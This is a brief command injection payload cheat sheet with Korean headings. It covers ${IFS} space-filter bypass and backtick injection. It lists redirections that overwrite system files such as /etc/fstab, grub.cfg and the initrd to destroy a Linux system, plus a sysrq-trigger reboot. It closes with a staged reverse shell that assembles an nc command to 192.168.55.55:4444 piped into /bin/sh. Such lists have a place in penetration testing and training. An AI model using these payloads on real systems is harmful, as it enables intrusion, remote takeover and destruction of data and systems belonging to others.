# COMMAND INJECTION
공백 우회  
|/usr/bin/touch${IFS}/opt/test_injection  

---------------------------------------------------
and, or ,; 우회  

`id>/opt/test_injection`  

--------------------------------------
라다이렉션만을 이용하여 시스템 파괴  

id>/lib/modules/*/kernel/drivers/usb/storage  

id>/etc/fstab  

id>/etc/mtab  

id>/etc/inittab  

id>/boot/grub/grub.cfg  

id>/boot/initrd.img-$(uname -r)  

id>/etc/systemd/  

echo 'b'>/proc/sysrq-trigger  

<<<b>/proc/sysrq-trigger  

root일 경우만 덮어씌울수있음.  

--------------------------------------------  
;sleep 5 # 해당 명령어가 먹힐 경우 리버스tcp 가능  
;mkfifo${IFS}/opt/f;  
;printf${IFS}'nc\x20192.168.55.55\x204444'>/opt/b;  
;printf${IFS}'\x20</opt/f\x7Cbin/sh>/opt/f'>/opt/c;  
;cat${IFS}/opt/b${IFS}/opt/c>/opt/t;  
;chmod${IFS}777${IFS}/opt/t;  
;./opt/t;  

